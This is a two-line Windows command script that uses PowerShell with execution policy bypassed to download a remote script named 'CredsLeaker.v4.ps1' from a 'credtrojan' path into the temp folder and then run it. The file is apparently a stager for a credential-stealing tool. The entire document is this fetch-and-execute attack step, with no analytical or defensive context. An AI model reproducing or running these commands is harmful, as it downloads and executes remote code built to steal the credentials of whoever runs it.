powershell -NoP -Exec Bypass "Invoke-RestMethod -uri "https://apsec.dev/scripts/credtrojan/CredsLeaker.v4.ps1" -OutFile $env:TEMP\cl.ps1"; 

Powershell.exe -ExecutionPolicy bypass -nologo -file %TEMP%\cl.ps1

pause